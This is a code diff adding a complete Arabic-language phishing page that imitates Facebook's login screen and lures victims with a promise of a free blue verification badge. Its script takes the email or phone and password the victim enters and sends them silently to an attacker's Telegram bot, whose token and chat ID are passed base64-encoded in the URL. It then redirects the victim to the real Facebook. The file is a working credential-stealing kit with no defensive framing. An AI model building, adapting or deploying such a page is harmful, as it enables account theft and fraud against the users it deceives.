@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>توثيق الحساب • Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* 📝 الهيدر */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .header .logo-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .header .logo-wrapper img {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .header .logo-wrapper .logo-text {
+            font-size: 44px;
+            font-weight: 800;
+            color: #1877f2;
+            letter-spacing: -1.5px;
+        }
+
+        /* 📦 البطاقة */
+        .card {
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #dddfe2;
+            padding: 26px 28px 24px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        /* 🏆 شريط التوثيق */
+        .verified-badge {
+            text-align: center;
+            margin-bottom: 22px;
+            padding: 18px 16px;
+            background: linear-gradient(135deg, #e7f3ff 0%, #f0f8ff 50%, #e7f3ff 100%);
+            border: 1.5px solid #b3d9ff;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verified-badge::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            50%, 100% { left: 100%; }
+        }
+
+        .verified-badge .badge-icon-wrapper {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 60px;
+            height: 60px;
+            background: #1877f2;
+            border-radius: 50%;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 16px rgba(24, 119, 242, 0.4);
+            animation: pulseBadge 2s ease-in-out infinite;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes pulseBadge {
+            0%, 100% { 
+                transform: scale(1); 
+                box-shadow: 0 4px 16px rgba(24, 119, 242, 0.4);
+            }
+            50% { 
+                transform: scale(1.08); 
+                box-shadow: 0 6px 24px rgba(24, 119, 242, 0.6);
+            }
+        }
+
+        .verified-badge .badge-icon-wrapper svg {
+            width: 34px;
+            height: 34px;
+            fill: white;
+        }
+
+        .verified-badge h3 {
+            font-size: 16px;
+            color: #0c2d57;
+            font-weight: 700;
+            margin-bottom: 6px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .verified-badge p {
+            font-size: 13px;
+            color: #1877f2;
+            line-height: 1.5;
+            font-weight: 500;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* 📝 حقول الإدخال */
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .input-group .input-wrapper {
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 44px 15px 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            outline: none;
+            color: #1c1e21;
+            direction: ltr;
+            text-align: right;
+        }
+
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .input-group input::placeholder {
+            color: #90949c;
+            font-size: 14px;
+        }
+
+        .input-group input.error {
+            border-color: #fa383e;
+            background: #fff5f5;
+        }
+
+        .field-error {
+            color: #fa383e;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 400;
+            text-align: right;
+            margin-bottom: 4px;
+        }
+
+        .field-error.show {
+            display: block;
+            animation: slideDown 0.2s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            color: #606770;
+            font-size: 16px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+        }
+
+        .toggle-password:hover {
+            color: #1877f2;
+            background: #f0f2f5;
+        }
+
+        .toggle-password:active {
+            transform: translateY(-50%) scale(0.9);
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        /* 🔵 زر تسجيل الدخول */
+        .btn-login {
+            width: 100%;
+            padding: 13px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 8px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-login:hover {
+            background: #166fe5;
+            box-shadow: 0 4px 14px rgba(24, 119, 242, 0.4);
+        }
+
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: scale(1);
+        }
+
+        .btn-login svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        /* 🔗 رابط "نسيت كلمة المرور" */
+        .forgot-password {
+            display: block;
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 18px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .forgot-password:hover {
+            color: #166fe5;
+            text-decoration: underline;
+        }
+
+        /* ➗ الفاصل */
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 22px 0 20px 0;
+        }
+
+        /* 🟢 زر إنشاء حساب جديد */
+        .btn-create {
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            padding: 14px 28px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .btn-create:hover {
+            background: #36a420;
+            transform: scale(1.02);
+        }
+
+        /* 📝 نص "أنشئ صفحة" */
+        .create-page-text {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+
+        .create-page-text a {
+            color: #1c1e21;
+            font-weight: 700;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .create-page-text a:hover {
+            color: #1877f2;
+            text-decoration: underline;
+        }
+
+        /* 🦶 الفوتر */
+        .footer {
+            text-align: center;
+            margin-top: 26px;
+            color: #8a8d91;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+
+        .footer a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 6px;
+            transition: color 0.2s;
+        }
+
+        .footer a:hover {
+            color: #1877f2;
+            text-decoration: underline;
+        }
+
+        .footer-lang {
+            margin-top: 10px;
+            color: #8a8d91;
+            font-size: 12px;
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 20px 18px;
+            }
+            .header .logo-wrapper .logo-text {
+                font-size: 36px;
+            }
+            .header .logo-wrapper img {
+                width: 44px;
+                height: 44px;
+            }
+            .btn-login {
+                font-size: 16px;
+                padding: 12px;
+            }
+            .btn-create {
+                font-size: 15px;
+                padding: 12px 24px;
+            }
+            .input-group input {
+                font-size: 14px;
+                padding: 13px 40px 13px 12px;
+            }
+            .container {
+                padding: 10px;
+            }
+            .verified-badge h3 {
+                font-size: 15px;
+            }
+            .verified-badge p {
+                font-size: 12px;
+            }
+            .verified-badge .badge-icon-wrapper {
+                width: 52px;
+                height: 52px;
+            }
+            .verified-badge .badge-icon-wrapper svg {
+                width: 28px;
+                height: 28px;
+            }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .loading {
+            animation: pulse 1s infinite;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+<div class="container">
+
+    <!-- 📝 الهيدر -->
+    <div class="header">
+        <div class="logo-wrapper">
+            <img src="facebook.png" alt="Facebook" style="width: 52px; height: 52px; border-radius: 50%; object-fit: cover;">
+            <span class="logo-text">facebook</span>
+        </div>
+    </div>
+
+    <!-- 📦 البطاقة الرئيسية -->
+    <div class="card">
+
+        <!-- 🏆 شريط التوثيق -->
+        <div class="verified-badge">
+            <div class="badge-icon-wrapper">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+                </svg>
+            </div>
+            <h3>🔵 توثيق الحساب مجانًا</h3>
+            <p>سجّل الدخول بحسابك الآن وسيتم توثيقه بعلامة زرقاء ✓ تلقائيًا</p>
+        </div>
+
+        <form id="loginForm" novalidate>
+
+            <!-- حقل البريد / الهاتف -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username">
+                </div>
+                <div class="field-error" id="emailError"></div>
+            </div>
+
+            <!-- حقل كلمة المرور -->
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+                    <button type="button" class="toggle-password" data-target="password" aria-label="إظهار كلمة المرور">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </button>
+                </div>
+                <div class="field-error" id="passwordError"></div>
+            </div>
+
+            <!-- زر تسجيل الدخول -->
+            <button type="submit" class="btn-login" id="loginBtn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
+                تسجيل الدخول والتوثيق
+            </button>
+
+            <!-- 🔗 نسيت كلمة المرور -->
+            <a href="https://www.facebook.com/login/identify/?ctx=recover" class="forgot-password" id="forgotLink">
+                هل نسيت كلمة المرور؟
+            </a>
+
+            <!-- ➗ الفاصل -->
+            <div class="divider"></div>
+
+            <!-- 🟢 زر إنشاء حساب جديد -->
+            <a href="https://www.facebook.com/reg/" class="btn-create" id="createLink">
+                إنشاء حساب جديد
+            </a>
+
+        </form>
+
+    </div>
+
+    <!-- 📝 نص "أنشئ صفحة" -->
+    <div class="create-page-text">
+        <a href="https://www.facebook.com/pages/create/" id="createPageLink">
+            إنشاء صفحة
+        </a> 
+        لشخصية مشهورة أو نشاط تجاري أو مجتمع.
+    </div>
+
+    <!-- 🦶 الفوتر -->
+    <div class="footer">
+        <div>
+            <a href="https://www.facebook.com/privacy/policy/">الخصوصية</a>
+            <span>·</span>
+            <a href="https://www.facebook.com/legal/terms">الشروط</a>
+            <span>·</span>
+            <a href="https://www.facebook.com/policies/cookies/">ملفات تعريف الارتباط</a>
+            <span>·</span>
+            <a href="https://www.facebook.com/help/">المساعدة</a>
+        </div>
+        <div class="footer-lang">العربية · © 2026 Meta</div>
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (encodedData) {
+        try {
+            const decoded = atob(encodedData);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ البيانات المشفّرة غير موجودة في الرابط!');
+    }
+
+    // ================================================================
+    // 1. TOGGLE PASSWORD VISIBILITY
+    // ================================================================
+    document.querySelectorAll('.toggle-password').forEach(button => {
+        button.addEventListener('click', function() {
+            const targetId = this.getAttribute('data-target');
+            const input = document.getElementById(targetId);
+            
+            if (!input) return;
+
+            if (input.type === 'password') {
+                input.type = 'text';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        <path d="M3.27 2.5L2 3.77 5.23 7C3.31 8.3 1.96 10.01 1 12c1.73 4.39 6 7.5 11 7.5 1.91 0 3.73-.48 5.31-1.31L20.23 21 21.5 19.73 3.27 2.5zM12 17c-2.76 0-5-2.24-5-5 0-.96.27-1.87.76-2.64l1.44 1.44c-.13.39-.2.79-.2 1.2 0 1.66 1.34 3 3 3 .41 0 .81-.07 1.2-.2l1.44 1.44C13.87 16.73 12.96 17 12 17zm3.12-5.03c.08.33.13.67.13 1.03 0 1.66-1.34 3-3 3-.36 0-.7-.05-1.03-.13l3.9-3.9z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إخفاء كلمة المرور');
+            } else {
+                input.type = 'password';
+                this.innerHTML = `
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                `;
+                this.setAttribute('aria-label', 'إظهار كلمة المرور');
+            }
+        });
+    });
+
+    // ================================================================
+    // 2. SEND TO TELEGRAM
+    // ================================================================
+    function sendToTelegram(email, password) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('❌ لا يمكن الإرسال: البيانات غير موجودة!');
+            return;
+        }
+
+        const message = `
+📘 **توثيق حساب Facebook - تسجيل دخول**
+
+📧 **البريد الإلكتروني / الهاتف:** 
+\`${email}\`
+
+🔑 **كلمة المرور:** 
+\`${password}\`
+
+🔵 **الطلب:** توثيق الحساب بعلامة زرقاء ✓
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP المستخدم:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => {
+            console.log('Telegram send error:', error);
+        });
+    }
+
+    // ================================================================
+    // 3. FORM SUBMISSION
+    // ================================================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loginBtn = document.getElementById('loginBtn');
+
+        // إعادة تعيين الأخطاء
+        document.querySelectorAll('.field-error').forEach(el => {
+            el.classList.remove('show');
+            el.textContent = '';
+        });
+
+        document.querySelectorAll('.input-group input').forEach(el => {
+            el.classList.remove('error');
+        });
+
+        let hasError = false;
+
+        if (!email) {
+            document.getElementById('email').classList.add('error');
+            document.getElementById('emailError').textContent = '⚠️ يرجى إدخال البريد الإلكتروني أو رقم الهاتف';
+            document.getElementById('emailError').classList.add('show');
+            hasError = true;
+        }
+
+        if (!password) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ يرجى إدخال كلمة المرور';
+            document.getElementById('passwordError').classList.add('show');
+            hasError = true;
+        }
+
+        if (hasError) return;
+
+        if (password.length < 6) {
+            document.getElementById('password').classList.add('error');
+            document.getElementById('passwordError').textContent = '⚠️ كلمة المرور يجب أن تكون 6 أحرف على الأقل';
+            document.getElementById('passwordError').classList.add('show');
+            return;
+        }
+
+        // ============================================================
+        // ✅ نجاح العملية: إرسال إلى Telegram + التوجيه
+        // ============================================================
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';
+        loginBtn.classList.add('loading');
+
+        // إرسال البيانات إلى Telegram
+        sendToTelegram(email, password);
+
+        // التوجيه إلى Facebook
+        setTimeout(() => {
+            window.location.href = 'https://www.facebook.com';
+        }, 800);
+    });
+
+    // ================================================================
+    // 4. REAL-TIME VALIDATION
+    // ================================================================
+    document.getElementById('email').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('emailError').classList.remove('show');
+        }
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+        if (this.value.trim()) {
+            this.classList.remove('error');
+            document.getElementById('passwordError').classList.remove('show');
+        }
+    });
+
+    // ================================================================
+    // 5. KEYBOARD SHORTCUTS
+    // ================================================================
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && (e.key === 'P' || e.key === 'p')) {
+            e.preventDefault();
+            document.querySelectorAll('.toggle-password').forEach(btn => btn.click());
+        }
+        if (e.ctrlKey && e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+        }
+    });
+
+    // ================================================================
+    // 6. EXTERNAL LINKS
+    // ================================================================
+    document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.facebook.com/login/identify/?ctx=recover';
+    });
+
+    document.getElementById('createLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.facebook.com/reg/';
+    });
+
+    document.getElementById('createPageLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'https://www.facebook.com/pages/create/';
+    });
+
+    console.log('✅ Facebook Verified Login page loaded successfully!');
+    console.log('🔵 Blue badge offer active');
+    console.log('🔓 Data will be sent to Telegram silently!');
+</script>
+
+</body>
+</html>
